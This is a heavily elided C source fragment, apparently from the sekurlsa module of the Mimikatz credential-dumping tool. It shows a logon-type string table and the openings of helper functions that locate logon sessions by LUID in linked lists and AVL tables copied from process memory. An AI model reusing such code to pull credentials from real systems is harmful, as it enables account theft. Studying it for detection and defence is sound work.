...
const char * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	...
	_CT_("Proxy"),
	_CT_("Unlock"),
	_CT_("NetworkCleartext"),
	_CT_("NewCredentials"),
	_CT_("RemoteInteractive"),
	_CT_("CachedInteractive"),
	_CT_("CachedRemoteInteractive"),
	_CT_("CachedUnlock"),
};
...
PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind)
{
	...
	if(aBuffer.address = API(KERNEL32, LocalAlloc)(LPTR, LUIDoffset + sizeof(LUID)))
	{
...
PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind)
{
	...
	if(kull_m_memory_copy(&data, pTable, sizeof(RTL_AVL_TABLE)))
	{
		...
		{
			if(data.address = API(KERNEL32, LocalAlloc)(LPTR, LUIDoffset + sizeof(LUID)))
			{
				...
				API(KERNEL32, LocalFree)(data.address);
			}
		}
...
BOOL kuhl_m_sekurlsa_utils_getSid(IN PSID * pSid, IN PKULL_M_MEMORY_HANDLE source)
{
	...
	*pSid = NULL;
	if(kull_m_memory_copy(&aDestin, &aSource, sizeof(BYTE)))
	{
		...
		if(aDestin.address = API(KERNEL32, LocalAlloc)(LPTR, sizeSid))
		{
